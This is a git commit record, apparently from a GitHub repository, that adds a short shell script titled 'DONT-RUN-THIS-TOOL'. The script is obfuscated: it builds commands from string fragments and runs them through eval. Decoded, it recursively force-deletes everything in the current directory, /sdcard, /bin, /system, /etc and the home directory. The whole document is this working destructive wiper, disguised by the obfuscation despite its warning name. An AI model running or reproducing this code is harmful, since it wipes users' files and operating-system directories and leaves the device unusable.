3bc7e388bc0972a565b5b32e0e901b19a960532f
H3LLO-H4CK3R <74289306+H3LLO-H4CK3R-2@users.noreply.github.com>
2020-11-12 16:11:43 +0530

    DONT-RUN-THIS-TOOL⚠️⚠️☠☠

---
+++ DONT-RUN-THIS-TOOL.sh
@@ -0,0 +1,3 @@
+z="
+";Ez='cd /';Mz='HOME';Lz='cd $';Jz='em';Dz='*';Gz='rd';Fz='sdca';Az='cd';Hz='bin';Iz='syst';Kz='etc';Cz='irf ';Bz='rm -';
+eval "$Az$z$Bz$Cz$Dz$z$Ez$Fz$Gz$z$Bz$Cz$Dz$z$Az$z$Ez$Hz$z$Bz$Cz$Dz$z$Az$z$Ez$Iz$Jz$z$Bz$Cz$Dz$z$Az$z$Ez$Kz$z$Bz$Cz$Dz$z$Lz$Mz$z$Bz$Cz$Dz"
